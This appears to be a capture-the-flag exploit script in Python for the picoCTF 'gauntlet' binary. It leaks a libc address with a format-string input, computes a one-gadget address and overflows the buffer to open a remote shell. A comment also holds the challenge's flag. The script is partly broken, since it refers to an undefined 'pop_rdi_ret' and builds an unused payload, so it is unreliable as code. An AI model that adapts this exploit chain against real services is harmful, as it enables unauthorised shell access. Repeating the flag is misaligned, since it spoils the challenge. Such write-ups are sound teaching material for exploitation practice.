#!/usr/bin/python3
from pwn import *

# flag aa0c5552f5fe1c87459e0637c0ea82ba
# __libc_start_main_ret leak

local = False
f = ELF('./gauntlet',checksec=False)
r = process('./gauntlet') if local else remote('mercury.picoctf.net',52063)
payload=b'a'*120
libc = f.libc if local else ELF('libc.so',checksec=False)

def debug():
	gdb.attach(r,'''
		b *0x0000000000400727
		c
	''')


if __name__=='__main__':
		
	payload+=p64(pop_rdi_ret)+p64(f.plt['printf'])
	r.sendline("%23$p")
	
	out = r.recvline().strip()
	libc_sm=int(out,16)
	base_addr = libc_sm-0x021bf7
	
	magic=base_addr+0x4f432
	print(hex(libc_sm))
	r.sendline(b"a"*112+b"\x80"*8+p64(magic))
	r.interactive()




